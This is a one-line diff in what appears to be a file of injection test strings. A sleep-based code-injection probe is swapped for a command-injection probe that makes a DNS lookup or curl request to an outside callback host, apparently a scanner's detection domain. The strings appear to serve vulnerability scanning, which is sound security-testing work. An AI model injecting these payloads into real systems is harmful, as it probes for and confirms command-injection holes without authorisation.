@@ -1,1 +1,1 @@
-555'&&sleep(27*1000)*urpmla&&'
+(nslookup -q=cname hitglvussnjgn65163.bxss.me||curl hitglvussnjgn65163.bxss.me))
